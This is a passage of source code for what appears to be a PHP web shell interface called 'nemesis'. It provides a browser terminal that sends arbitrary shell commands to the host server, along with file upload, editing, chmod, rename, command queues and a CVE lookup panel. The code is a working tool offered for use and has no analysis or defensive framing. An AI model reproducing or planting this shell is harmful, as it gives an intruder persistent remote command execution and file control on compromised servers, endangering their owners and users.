    <div class="overlay" id="ed-ov">
    <div id="ed-modal">
    <div id="ed-bar">
    <span id="ed-name">-</span><span id="ed-status"></span><span id="ed-autosave" style="font-size:8px;color:var(--a3)"></span>
    <button class="tb2" style="font-size:8px" onclick="toggleFR()">Find</button>
    <button class="tb2" style="font-size:8px" onclick="toggleGoto()">Line</button>
    <button class="tb2" style="font-size:8px" onclick="edCloseTab()">Close Tab</button>
    <button class="tb2" style="font-size:8px" onclick="closeOv('ed-ov')">Close</button>
    <button class="tb2" style="font-size:8px;border-color:var(--a3);color:var(--a3)" onclick="saveFile()">Save</button>
    </div>
    <div id="ed-tabs"></div>
    <div id="ed-fr">
    <input id="fr-find" placeholder="Find..."><input id="fr-rep" placeholder="Replace...">
    <button class="tb2" style="font-size:8px" onclick="doFR()">Replace All</button>
    <span id="fr-info" style="font-size:8px;color:var(--dim)"></span>
    </div>
    <div id="ed-goto">
    <span style="font-size:8.5px;color:var(--dim)">Go to line:</span>
    <input type="number" id="goto-ln" placeholder="1" min="1">
    <button class="tb2" style="font-size:8px" onclick="doGoto()">Go</button>
    </div>
    <div id="ed-wrap"><div id="ed-lines">1</div><textarea id="ed-area" spellcheck="false"></textarea></div>
    <div id="ed-info"><span id="ed-pos">Ln 1, Col 1</span><span id="ed-chars">0 chars</span><span id="ed-wrap-tog" style="cursor:pointer;user-select:none" onclick="toggleEdWrap()">Wrap:OFF</span><span style="flex:1"></span><span>Ctrl+S | Ctrl+H | Ctrl+G | Ctrl+W | Tab=4sp</span></div>
    </div>
    </div>
    <!-- Chmod -->
    <div class="overlay" id="chmod-ov">
    <div class="modal">
    <h2>Chmod</h2>
    <div class="tf"><label>File</label><input class="ti" id="ch-f" readonly></div>
    <div class="tf"><label>Mode</label>
    <select class="ti" id="ch-m">
    <option value="775">775 - rwxrwxr-x</option><option value="755">755 - rwxr-xr-x</option>
    <option value="644" selected>644 - rw-r--r--</option><option value="777">777 - rwxrwxrwx</option>
    <option value="600">600 - rw-------</option><option value="444">444 - r--r--r-- (lock)</option><option value="000">000</option>
    </select>
    </div>
    <div class="mrow"><button class="tb2" onclick="closeOv('chmod-ov')">Batal</button><button class="tb2" style="border-color:var(--a3);color:var(--a3)" onclick="doChmod()">Apply</button></div>
    </div>
    </div>
    <!-- Rename -->
    <div class="overlay" id="rename-ov">
    <div class="modal">
    <h2>Rename</h2>
    <div class="tf"><label>Nama Baru</label><input class="ti" id="rn-n" placeholder="filename.ext" onkeydown="if(event.key==='Enter')doRename()"></div>
    <div class="mrow"><button class="tb2" onclick="closeOv('rename-ov')">Batal</button><button class="tb2" style="border-color:var(--a3);color:var(--a3)" onclick="doRename()">Rename</button></div>
    </div>
    </div>
    <!-- Upload -->
    <div class="overlay" id="upload-ov">
    <div class="modal">
    <h2>Upload</h2>
    <div id="dz" onclick="document.getElementById('up-f').click()" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
    <input type="file" id="up-f" multiple onchange="doUpload()">
    <div>🗂 Drag & drop or click</div>
    <div style="font-size:8px;margin-top:3px;color:var(--dim)">Upload to: <span id="up-dir">-</span></div>
    </div>
    <button class="tb2" onclick="closeOv('upload-ov')">Tutup</button>
    </div>
    </div>
    <!-- Command Palette -->
    <div id="palette" style="display:none;position:fixed;top:15%;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:10px;padding:12px;z-index:950;min-width:420px;max-width:92vw;box-shadow:0 16px 50px rgba(0,0,0,.7);backdrop-filter:blur(10px)">
    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:8px;font-family:'Space Grotesk',sans-serif;font-weight:700;text-transform:uppercase">Command Palette</div>
    <input id="pal-in" style="width:100%;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 9px;border-radius:5px;outline:none;transition:border-color .2s" placeholder="search command or type...">
    <div id="pal-res" style="margin-top:6px;max-height:230px;overflow-y:auto;display:flex;flex-direction:column;gap:2px"></div>
    </div>
    <!-- History Search -->
    <div id="hist-srch" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s2);border:1px solid var(--a);border-radius:8px;padding:10px;z-index:900;min-width:370px;box-shadow:0 8px 30px rgba(0,0,0,.6)">
    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:6px">HISTORY SEARCH (ESC to close)</div>
    <input id="hs-in" style="width:100%;background:var(--s3);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:5px 8px;border-radius:4px;outline:none" placeholder="search...">
    <div id="hs-res" style="margin-top:5px;max-height:150px;overflow-y:auto"></div>
    </div>
    <!-- Multiline -->
    <div id="ml-ov" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:8px;padding:12px;z-index:900;min-width:420px;max-width:90vw;box-shadow:0 8px 30px rgba(0,0,0,.6)">
    <div style="font-size:8px;color:var(--dim);margin-bottom:7px">MULTI-LINE (Ctrl+Enter = run, Esc = close)</div>
    <textarea id="ml-in" style="width:100%;height:110px;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10.5px;padding:7px;border-radius:5px;outline:none;resize:vertical;tab-size:4" placeholder="Commands, one per line..."></textarea>
    <div style="display:flex;gap:6px;margin-top:7px">
    <button onclick="closeML()" style="flex:1;background:transparent;border:1px solid var(--b);color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:9px;padding:5px;border-radius:4px;cursor:pointer">Close</button>
    <button onclick="runML()" style="flex:1;background:var(--a);border:none;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:9px;font-weight:700;padding:5px;border-radius:4px;cursor:pointer;letter-spacing:.03em">▶ Run Queue</button>
    </div>
    </div>
    <!-- Output filter -->
    <div id="filter-bar" style="display:none;gap:5px;align-items:center;background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:3px 8px">
    <span style="font-size:8px;color:var(--dim)">FILTER:</span>
    <input id="filter-in" style="flex:1;background:transparent;border:none;outline:none;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10px" placeholder="grep output...">
    <span id="filter-cnt" style="font-size:8px;color:var(--dim)"></span>
    <button onclick="closeFilter()" style="background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:11px">✕</button>
    </div>
    <div id="toast"></div>
    <script>
    const HOST = '<?=addslashes($hostname)?>';
    const LUSER = '<?=addslashes($user)?>';
    let CSRF = '<?=addslashes($csrf)?>';
    const IMG_EXTS = ['png','jpg','jpeg','gif','svg','webp'];
    const TXT_EXTS = ['txt','md','php','js','ts','css','html','json','xml','sh','conf','log','env','py','rb','sql'];
    const P = {
        1:{busy:false,hist:[],hidx:-1,temp:'',cwd:'<?=addslashes($cwd)?>',tabs:{'default':{h:[],cwd:'<?=addslashes($cwd)?>'}},atab:'default',tc:1,sm:[],si:0,wrap:true},
        2:{busy:false,hist:[],hidx:-1,temp:'',cwd:'<?=addslashes($cwd)?>',tabs:{'default2':{h:[],cwd:'<?=addslashes($cwd)?>'}},atab:'default2',tc:1,sm:[],si:0,wrap:true}
    };
    let fmDir='<?=addslashes($cwd)?>',fmAll=[],fmSort='name',fmView='list',selFiles=new Set();
    let edFiles=[],edIdx=0,edWrap=false,edAsTimer=null;
    let chFile='',rnFile='',splitOn=false;
    let fontSize=11;
    let acItems=[],acActive=-1,acPane=1;
    let cmdQueue=[],qRunning=false;
    let cwdHist=['<?=addslashes($cwd)?>'],cwdHidx=0;
    let ghostSug='';
    (()=>{
        const msgs=['Initializing...','Loading modules...','Mounting fs...','Checking CSRF...','Session verify...','Starting shell...','Ready.'];
        let pct=0,mi=0;
        const bar=document.getElementById('lbar'),stat=document.getElementById('lstat'),pctEl=document.getElementById('lpct');
        const iv=setInterval(()=>{
            pct+=Math.random()*20+5;if(pct>100)pct=100;
            bar.style.width=pct+'%';pctEl.textContent=Math.floor(pct)+'%';
        if(mi<msgs.length-1&&pct>(mi+1)*(100/msgs.length))stat.textContent=msgs[++mi];
        if(pct>=100){clearInterval(iv);setTimeout(()=>{
            document.getElementById('loading').classList.add('gone');
            document.getElementById('app').style.opacity='1';
        document.getElementById('cmd1').focus();
        updateDash();setInterval(updateDash,15000);
        setInterval(()=>document.getElementById('sb-time').textContent=new Date().toLocaleTimeString(),1000);
        },400);}
        },85);
    })();
    async function post(data){
        const fd=new FormData();data.csrf=CSRF;
        for(const[k,v] of Object.entries(data))fd.append(k,v);
        const r=await fetch(location.href,{method:'POST',body:fd});
        const j=await r.json();
        if(j.csrf)CSRF=j.csrf;
        return j;
    }
    function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
    function fmtSz(b){if(b===null||b===undefined)return'';if(b<1024)return b+'B';if(b<1048576)return(b/1024).toFixed(1)+'K';return(b/1048576).toFixed(1)+'M'}
    function ficon(e){const m={js:'📜',ts:'📜',php:'🐘',py:'🐍',html:'🌐',css:'🎨',json:'📋',md:'📄',txt:'📄',sh:'⚙️',png:'🖼',jpg:'🖼',jpeg:'🖼',gif:'🖼',svg:'🖼',webp:'🖼',pdf:'📕',zip:'📦',tar:'📦',gz:'📦',sql:'🗄',xml:'📋',env:'🔐',log:'📋',conf:'⚙️'};return m[e]||'📄'}
    let toastT;
    function toast(m,t=''){const el=document.getElementById('toast');el.textContent=m;el.className='on '+t;clearTimeout(toastT);toastT=setTimeout(()=>el.className='',2700);}
    function showOv(id){document.getElementById(id).classList.add('on');}
    function closeOv(id){document.getElementById(id).classList.remove('on');}
    function sevColor(s){const u=(s||'').toUpperCase();if(u==='CRITICAL')return'var(--d)';if(u==='HIGH')return'#f97316';if(u==='MEDIUM')return'var(--w)';if(u==='LOW')return'var(--a3)';return'var(--dim)';}
    async function updateDash(){
        try{
            const r=await post({action:'stats'});
            const free=r.disk_free,total=r.disk_total,pct=total>0?Math.round((1-free/total)*100):0;
            document.getElementById('dw-disk').textContent=Math.round(free/1e9)+'/'+ Math.round(total/1e9)+'GB';
            document.getElementById('dw-df').style.width=pct+'%';
            const ut=parseFloat(r.uptime||0),h=Math.floor(ut/3600),m=Math.floor((ut%3600)/60);
            document.getElementById('dw-up').textContent=h+'h'+m+'m';
            document.getElementById('dw-load').textContent=(r.load||'N/A').split(' ')[0];
            document.getElementById('si-disk').textContent=Math.round(free/1e9)+'/'+ Math.round(total/1e9)+'GB ('+pct+'%)';
            document.getElementById('si-df').style.width=pct+'%';
            document.getElementById('si-up').textContent=h+'h'+m+'m';
            document.getElementById('si-load').textContent=(r.load||'N/A').split(' ')[0];
            if(r.extensions)document.getElementById('si-ext').textContent=r.extensions.join(', ');
        }catch{}
    }
    function adjFont(d){fontSize=Math.max(8,Math.min(16,fontSize+d));document.documentElement.style.setProperty('--fs',fontSize+'px');localStorage.setItem('nemesisfs',fontSize);}
    (()=>{const f=localStorage.getItem('nemesisfs');if(f){fontSize=parseInt(f);document.documentElement.style.setProperty('--fs',fontSize+'px');}})();
    function setTheme(t){document.documentElement.dataset.theme=t;document.querySelectorAll('.td').forEach(d=>d.classList.remove('on'));document.querySelector('.td-'+t)?.classList.add('on');localStorage.setItem('nemesist',t);document.documentElement.style.removeProperty('--a');localStorage.removeItem('nemesisc');}
    (()=>{const t=localStorage.getItem('nemesist');if(t)setTheme(t);const c=localStorage.getItem('nemesisc');if(c){document.getElementById('color-in').value=c;document.documentElement.style.setProperty('--a',c);}})();
    function setCustomColor(h){document.documentElement.style.setProperty('--a',h);localStorage.setItem('nemesisc',h);}
    function sp(id,btn){
        document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
        document.querySelectorAll('.nb').forEach(b=>b.classList.remove('on'));
        document.getElementById('panel-'+id).classList.add('on');
        btn.classList.add('on');
        if(id==='files'){fmLoad(fmDir);buildTree();}
        if(id==='sysinfo'){doSI();updateDash();}
        if(id==='cfg'){loadAliases();loadPins();}
    }
    function toggleFS(pid){document.getElementById(pid).classList.toggle('fullscreen');}
    function toggleSplit(){
        splitOn=!splitOn;
        document.getElementById('pane2').classList.toggle('show',splitOn);
        document.getElementById('split-div').style.display=splitOn?'block':'none';
        updateBC(2,P[2].cwd);
    }
    (()=>{
        const div=document.getElementById('split-div');let isR=false,sx=0,sw=0;
        div.addEventListener('mousedown',e=>{isR=true;sx=e.clientX;sw=document.getElementById('pane1').offsetWidth;document.body.style.userSelect='none';});
        document.addEventListener('mousemove',e=>{if(!isR)return;const d=e.clientX-sx;document.getElementById('pane1').style.flex='none';document.getElementById('pane1').style.width=Math.max(200,sw+d)+'px';});
        document.addEventListener('mouseup',()=>{isR=false;document.body.style.userSelect='';});
    })();
    function parseANSI(t){return'<span>'+esc(t).replace(/\x1b\[([0-9;]*)m/g,(m,c)=>{if(!c||c==='0')return'</span><span>';const cl=c.split(';').map(n=>{n=parseInt(n);if(n===1)return'ab';if(n===3)return'ai';if(n===4)return'au';if((n>=30&&n<=37)||(n>=90&&n<=97))return'a'+n;return'';}).filter(Boolean).join(' ');return cl?`</span><span class="${cl}">`:'</span><span>';})+'</span>';}
    function updateBC(pane,path){
        const bc=document.getElementById('bc'+pane);if(!bc)return;
        const parts=path.split('/').filter(Boolean);
        let html=`<span class="bcp" onclick="cwdNav(${pane},'/')">~</span>`;let built='/';
        parts.forEach(p=>{built+=(built==='/'?'':'/')+p;const b=built;html+=`<span class="bcs">/</span><span class="bcp" onclick="cwdNav(${pane},'${b.replace(/'/g,"\\'")}')">${esc(p)}</span>`;});
        bc.innerHTML=html;P[pane].cwd=path;
        if(pane===1){document.getElementById('sb-cwd').textContent=path;}
        if(path!==cwdHist[cwdHidx]){cwdHist=cwdHist.slice(0,cwdHidx+1);cwdHist.push(path);cwdHidx=cwdHist.length-1;}
    }
    function cwdNav(pane,path){const inp=document.getElementById('cmd'+pane);inp.value='cd '+path;runCmd(pane);}
    function cwdBack(){if(cwdHidx>0){cwdHidx--;const inp=document.getElementById('cmd1');inp.value='cd '+cwdHist[cwdHidx];runCmd(1);}}
    function cwdFwd(){if(cwdHidx<cwdHist.length-1){cwdHidx++;const inp=document.getElementById('cmd1');inp.value='cd '+cwdHist[cwdHidx];runCmd(1);}}
    function updateGhost(pane){
        const inp=document.getElementById('cmd'+pane);
        const val=inp.value;const st=P[pane];
        const ghost=document.getElementById('ghost'+pane);
        if(!val||st.hidx!==-1||!ghost){ghostSug='';if(ghost)ghost.textContent='';return;}
        const match=[...st.hist].reverse().find(h=>h.startsWith(val)&&h!==val);
        if(match){
            ghostSug=match;
            const span=document.createElement('span');span.style.cssText='visibility:hidden;position:absolute;font-family:JetBrains Mono,monospace;font-size:'+fontSize+'px;white-space:pre';span.textContent=val;document.body.appendChild(span);const w=span.offsetWidth;document.body.removeChild(span);
            ghost.style.left=(w+2)+'px';ghost.textContent=match.slice(val.length);
        } else {ghostSug='';ghost.textContent='';}
    }
    [1,2].forEach(pane=>{
        const inbar=document.getElementById('cmd'+pane).closest('.inbar');if(!inbar)return;
        inbar.style.position='relative';
    const g=document.createElement('span');g.id='ghost'+pane;
    g.style.cssText='position:absolute;top:50%;transform:translateY(-50%);pointer-events:none;color:var(--faint);font-family:JetBrains Mono,monospace;font-size:'+fontSize+'px;opacity:.45;white-space:pre;z-index:0;left:0';
    inbar.appendChild(g);
    });
    function addEntry(pane,ph,oh,cls=''){
        const term=document.getElementById('terminal'+pane);
        const d=document.createElement('div');d.className='entry';
        d.innerHTML=(ph?`<div class="ep">${ph}</div>`:'')+
        (oh!==undefined?`<div class="eo ${cls}">${oh}</div>`:'');
        const eo=d.querySelector('.eo');
        if(eo&&ph){
            const ep=d.querySelector('.ep');
            const cb=document.createElement('button');cb.textContent='⎘';cb.title='Copy output';cb.style.cssText='background:transparent;border:1px solid var(--b);color:var(--dim);cursor:pointer;font-size:8px;padding:1px 4px;border-radius:2px;float:right;margin-left:4px;transition:all .15s';cb.onmouseenter=()=>{cb.style.borderColor='var(--a)';cb.style.color='var(--a)';};cb.onmouseleave=()=>{cb.style.borderColor='var(--b)';cb.style.color='var(--dim)';};cb.onclick=e=>{e.stopPropagation();navigator.clipboard?.writeText(eo.textContent).then(()=>{cb.textContent='✓';setTimeout(()=>cb.textContent='⎘',1200);});};
            const db=document.createElement('button');db.textContent='✕';db.title='Delete entry';db.style.cssText='background:transparent;border:none;color:var(--faint);cursor:pointer;font-size:9px;padding:1px 3px;float:right;transition:all .15s;opacity:.4';db.onmouseenter=()=>db.style.opacity='1';db.onmouseleave=()=>db.style.opacity='.4';db.onclick=e=>{e.stopPropagation();d.style.animation='fadeOut .2s ease';setTimeout(()=>d.remove(),200);};
            if(ep){ep.appendChild(db);ep.appendChild(cb);}
        }
        term.appendChild(d);term.scrollTop=term.scrollHeight;
        const entries=term.querySelectorAll('.entry');if(entries.length>300)entries[0].remove();
        return d;
    }
    function ps1(pane,cwd,cmd){return`<span class="eu">${esc(LUSER)}</span><span class="eat">@</span><span class="eho">${esc(HOST)}</span><span class="ec">:</span><span class="epath">${esc(cwd)}</span><span class="edol">$</span> <span class="ecmd">${esc(cmd)}</span>`;}
    async function runCmd(pane=1){
        const st=P[pane];const inp=document.getElementById('cmd'+pane);
        const cmd=inp.value.trim();if(!cmd||st.busy)return;
        if(cmd==='exit'){addEntry(pane,ps1(pane,st.cwd,cmd),'');addEntry(pane,'','Session closed.','info');inp.disabled=true;document.getElementById('run-btn'+pane).disabled=true;return;}
        if(cmd==='help'){addEntry(pane,ps1(pane,st.cwd,cmd),'');addEntry(pane,'','<span class="a96">Shortcuts:</span> Tab=AC ↑↓=History Ctrl+L=Clear Ctrl+F=Search Ctrl+R=HSearch Ctrl+P=Palette Shift+Enter=Multiline','info');inp.value='';return;}
        st.hist.push(cmd);st.hidx=-1;st.temp='';inp.value='';
        const g=document.getElementById('ghost'+pane);if(g)g.textContent='';
        st.busy=true;document.getElementById('run-btn'+pane).disabled=true;document.getElementById('cwdb'+pane).classList.add('busy');
        const entry=addEntry(pane,ps1(pane,st.cwd,cmd),'<span class="spin"></span>');
        const od=entry.querySelector('.eo');
        try{
            const r=await post({action:'exec',cmd});
            if(r.cwd){updateBC(pane,r.cwd);fmDir=r.cwd;}
            if(r.clear)document.getElementById('terminal'+pane).querySelectorAll('.entry').forEach(e=>e.remove());
            else{const raw=r.out??r.error??'';od.innerHTML=parseANSI(raw);if(!raw)od.style.display='none';}
            if(r.ms!==undefined){const tb=document.createElement('span');tb.className='timer';tb.textContent=r.ms+'ms';entry.querySelector('.ep')?.appendChild(tb);}
            if(pane===1)document.getElementById('sb-cmd').textContent=cmd.substring(0,40)+(cmd.length>40?'...':'')+(r.ms?` [${r.ms}ms]`:'');
        }catch(e){od.innerHTML=`<span style="color:var(--d)">Error: ${esc(e.message)}</span>`;}
        st.busy=false;document.getElementById('run-btn'+pane).disabled=false;document.getElementById('cwdb'+pane).classList.remove('busy');
        inp.focus();
    }
    function clearTerm(pane=1){document.getElementById('terminal'+pane).querySelectorAll('.entry').forEach(e=>e.remove());document.getElementById('cmd'+pane).focus();}
    function toggleWrap(){P[1].wrap=!P[1].wrap;document.getElementById('terminal1').classList.toggle('nowrap',!P[1].wrap);const b=document.getElementById('wrap-btn');b.style.borderColor=P[1].wrap?'':'var(--d)';b.style.color=P[1].wrap?'':'var(--d)';}
    function exportOutput(){const lines=[];document.getElementById('terminal1').querySelectorAll('.entry').forEach(e=>{const ep=e.querySelector('.ep'),eo=e.querySelector('.eo');if(ep)lines.push('$ '+ep.textContent.trim().replace(/\s+/g,' '));if(eo)lines.push(eo.textContent);lines.push('');});const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([lines.join('\n')],{type:'text/plain'}));a.download='nemesis_output_'+Date.now()+'.txt';a.click();toast('Output exported!','ok');}
    [1,2].forEach(pane=>{
        const inp=document.getElementById('cmd'+pane);if(!inp)return;
        inp.addEventListener('input',()=>updateGhost(pane));
        inp.addEventListener('keydown',e=>{
            const st=P[pane];
            if(acItems.length&&acPane===pane){
                if(e.key==='ArrowDown'){e.preventDefault();moveAc(1);return;}
                if(e.key==='ArrowUp'){e.preventDefault();moveAc(-1);return;}
                if(e.key==='Tab'||e.key==='Enter'){e.preventDefault();if(acActive>=0)applyAc(acItems[acActive],pane);else if(acItems.length===1)applyAc(acItems[0],pane);closeAc();if(e.key==='Enter'&&acActive<0)runCmd(pane);return;}
                if(e.key==='Escape'){closeAc();return;}
            }
            if(e.key==='ArrowRight'&&ghostSug&&inp.selectionStart===inp.value.length){e.preventDefault();inp.value=ghostSug;const g=document.getElementById('ghost'+pane);if(g)g.textContent='';ghostSug='';return;}
            if(e.key==='Enter'&&e.shiftKey){e.preventDefault();openML();return;}
            if(e.key==='Enter'){e.preventDefault();runCmd(pane);return;}
            if(e.key==='Tab'){e.preventDefault();triggerAc(pane);return;}
            if(e.key==='ArrowUp'){e.preventDefault();if(st.hidx===-1)st.temp=inp.value;if(st.hist.length){st.hidx=Math.min(st.hidx+1,st.hist.length-1);inp.value=st.hist[st.hist.length-1-st.hidx];}return;}
            if(e.key==='ArrowDown'){e.preventDefault();if(st.hidx>0){st.hidx--;inp.value=st.hist[st.hist.length-1-st.hidx];}else{st.hidx=-1;st.temp='';inp.value=st.temp;}return;}
            if(e.key==='l'&&e.ctrlKey){e.preventDefault();clearTerm(pane);return;}
            if(e.key==='f'&&e.ctrlKey){e.preventDefault();toggleSrch(pane);return;}
            if(e.key==='r'&&e.ctrlKey){e.preventDefault();openHistSrch(pane);return;}
            if(e.key==='p'&&e.ctrlKey&&!e.shiftKey){e.preventDefault();openPalette(pane);return;}
            if(e.key==='g'&&e.ctrlKey){e.preventDefault();openFilter(pane);return;}
            if(e.key==='ArrowLeft'&&e.altKey){e.preventDefault();cwdBack();return;}
            if(e.key==='ArrowRight'&&e.altKey){e.preventDefault();cwdFwd();return;}
        });
        document.getElementById('terminal'+pane)?.addEventListener('click',()=>inp.focus());
    });
    document.addEventListener('click',e=>{
        if(!document.getElementById('ac').contains(e.target)&&!e.target.classList.contains('cmd-i'))closeAc();
        if(!document.getElementById('palette').contains(e.target)&&e.target.id!=='pal-in')document.getElementById('palette').style.display='none';
    });
        document.addEventListener('keydown',e=>{
            if(e.ctrlKey&&e.shiftKey&&e.key==='C'){e.preventDefault();const id=prompt('CVE ID (CVE-2024-1234):');if(id){document.getElementById('cve-id').value=id.trim().toUpperCase();document.querySelectorAll('.nb').forEach(b=>b.classList.remove('on'));document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));document.getElementById('panel-cve').classList.add('on');cveTab('lookup',null);doCVEL();}}
        });
        let gTabC=2;
        function newTab(pane=1){gTabC++;const id='t'+pane+'_'+Date.now();P[pane].tabs[id]={h:[],cwd:P[pane].cwd};const bar=document.getElementById('tab-bar');const addBtn=bar.querySelector('#add-tab');const t=document.createElement('div');t.className='tab';t.id='tab-'+id;t.dataset.id=id;t.innerHTML=`<span>terminal ${gTabC}</span><span class="tab-x" onclick="closeTab(event,'${id}')">✕</span>`;t.addEventListener('click',ev=>{if(!ev.target.classList.contains('tab-x'))switchTab(id,pane);});bar.insertBefore(t,addBtn);switchTab(id,pane);}
        function switchTab(id,pane=1){const st=P[pane];st.tabs[st.atab]={h:[...st.hist],cwd:st.cwd};st.atab=id;document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));document.getElementById('tab-'+id)?.classList.add('on');st.hist=st.tabs[id]?.h||[];st.hidx=-1;clearTerm(pane);addEntry(pane,'',`<span style="color:var(--dim)">Switched: ${id}</span>`);}
        function closeTab(e,id,pane=1){e.stopPropagation();if(document.querySelectorAll('.tab').length<=1){toast('Last tab!','err');return;}document.getElementById('tab-'+id)?.remove();delete P[pane].tabs[id];if(P[pane].atab===id){const rem=document.querySelector('.tab');if(rem)switchTab(rem.dataset.id,pane);}}
        function renderPins(pins){const bar=document.getElementById('pin-bar');if(!pins?.length){bar.className='';return;}bar.className='show';bar.innerHTML=pins.map(p=>`<button class="pin-btn" onclick="runPin(1,'${esc(p).replace(/'/g,"\\'")}')" >📌 ${esc(p)}<span class="pin-x" onclick="event.stopPropagation();delPin('${esc(p).replace(/'/g,"\\'")}')" >✕</span></button>`).join('');}
        function runPin(pane,cmd){document.getElementById('cmd'+pane).value=cmd;runCmd(pane);}
        async function addPin(){const cmd=document.getElementById('cmd1').value.trim();if(!cmd){toast('Type command first','err');return;}const r=await post({action:'add_pin',cmd});renderPins(r.pins);toast('Pinned!','ok');}
        async function addPinM(){const cmd=document.getElementById('pin-c').value.trim();if(!cmd)return;const r=await post({action:'add_pin',cmd});renderPins(r.pins);document.getElementById('pin-c').value='';toast('Pinned!','ok');loadPins();}
        async function delPin(cmd){const r=await post({action:'del_pin',cmd});renderPins(r.pins||[]);loadPins();}
        async function loadPins(){const r=await post({action:'get_pins'});renderPins(r.pins||[]);const list=document.getElementById('pin-list');list.innerHTML=(r.pins||[]).map(p=>`<div style="display:flex;align-items:center;gap:5px;padding:2px 0;font-size:9px"><span style="flex:1;color:var(--t)">${esc(p)}</span><button class="tb2" style="font-size:7.5px;padding:1px 5px;border-color:var(--d);color:var(--d)" onclick="delPin('${esc(p).replace(/'/g,"\\'")}')">Del</button></div>`).join('')||'<div style="color:var(--dim);font-size:9px">No pins yet.</div>';}
        async function addAlias(){const n=document.getElementById('al-n').value.trim(),c=document.getElementById('al-c').value.trim();if(!n||!c)return;await post({action:'set_alias',name:n,cmd:c});document.getElementById('al-n').value='';document.getElementById('al-c').value='';toast('Alias added','ok');loadAliases();}
        async function delAlias(n){await post({action:'del_alias',name:n});toast('Removed','ok');loadAliases();}
        async function loadAliases(){const r=await post({action:'get_aliases'});const al=r.aliases||{};document.getElementById('alias-list').innerHTML=Object.entries(al).map(([k,v])=>`<div style="display:flex;align-items:center;gap:5px;padding:2px 0;font-size:9px"><span style="color:var(--a);flex-shrink:0">${esc(k)}</span><span style="color:var(--dim)">→</span><span style="flex:1;color:var(--t)">${esc(v)}</span><button class="tb2" style="font-size:7.5px;padding:1px 5px;border-color:var(--d);color:var(--d)" onclick="delAlias('${k}')">Del</button></div>`).join('')||'<div style="color:var(--dim);font-size:9px">No aliases.</div>';}
        function addQ(cmd){if(!cmd)return;cmdQueue.push(cmd);updateQUI();toast('Queue: '+cmd.substring(0,30),'ok');if(!qRunning)runQ();}
        async function runQ(){if(!cmdQueue.length){qRunning=false;updateQUI();return;}qRunning=true;updateQUI();const cmd=cmdQueue.shift();document.getElementById('cmd1').value=cmd;await runCmd(1);setTimeout(runQ,300);}
        function clearQ(){cmdQueue=[];qRunning=false;updateQUI();toast('Queue cleared');}
        function updateQUI(){const b=document.getElementById('queue-badge');if(b){b.textContent=cmdQueue.length?`⏳${cmdQueue.length}`:'';b.style.display=cmdQueue.length?'inline':'none';}const ql=document.getElementById('queue-list');if(ql)ql.innerHTML=cmdQueue.length?cmdQueue.map((c,i)=>`<div style="display:flex;align-items:center;gap:5px;padding:2px 0;font-size:9px"><span style="color:var(--dim)">${i+1}.</span><span style="flex:1;color:var(--t)">${esc(c)}</span><button onclick="cmdQueue.splice(${i},1);updateQUI()" style="background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:10px">✕</button></div>`).join(''):'<div style="color:var(--dim);font-size:9px">Queue empty.</div>';}
        function toggleSrch(pane=1){const sb=document.getElementById('srch'+pane);sb.classList.toggle('on');if(sb.classList.contains('on'))sb.querySelector('input').focus();else clearHL(pane);}
        function clearHL(pane){const term=document.getElementById('terminal'+pane);term.querySelectorAll('.hl,.hl-c').forEach(el=>{const p=el.parentNode;p.replaceChild(document.createTextNode(el.textContent),el);p.normalize();});P[pane].sm=[];updSN(pane);}
        function doSearch(pane){clearHL(pane);const q=document.getElementById('srch'+pane).querySelector('input').value.trim();if(!q){updSN(pane);return;}const term=document.getElementById('terminal'+pane);const walker=document.createTreeWalker(term,NodeFilter.SHOW_TEXT);const nodes=[];let n;while(n=walker.nextNode())nodes.push(n);const re=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');P[pane].sm=[];nodes.forEach(node=>{let m,text=node.textContent,parts=[],last=0;while((m=re.exec(text))!==null){if(m.index>last)parts.push(document.createTextNode(text.slice(last,m.index)));const sp=document.createElement('span');sp.className='hl';sp.textContent=m[0];parts.push(sp);P[pane].sm.push(sp);last=m.index+m[0].length;}if(parts.length){if(last<text.length)parts.push(document.createTextNode(text.slice(last)));const f=document.createDocumentFragment();parts.forEach(p=>f.appendChild(p));node.parentNode.replaceChild(f,node);}});P[pane].si=0;hlCur(pane);updSN(pane);}
        function hlCur(pane){P[pane].sm.forEach((m,i)=>m.className=i===P[pane].si?'hl-c':'hl');if(P[pane].sm[P[pane].si])P[pane].sm[P[pane].si].scrollIntoView({block:'center'});}
        function searchNav(pane,d){const st=P[pane];st.si=(st.si+d+st.sm.length)%Math.max(st.sm.length,1);hlCur(pane);updSN(pane);}
        function updSN(pane){const st=P[pane];document.getElementById('srch-n'+pane).textContent=st.sm.length?`${st.si+1}/${st.sm.length}`:'0/0';}
        function openFilter(pane=1){const fb=document.getElementById('filter-bar');const term=document.getElementById('panel-terminal');if(fb){fb.style.display='flex';document.getElementById('filter-in').focus();}}
        function closeFilter(){const fb=document.getElementById('filter-bar');fb.style.display='none';document.getElementById('terminal1').querySelectorAll('.entry').forEach(e=>e.style.display='');}
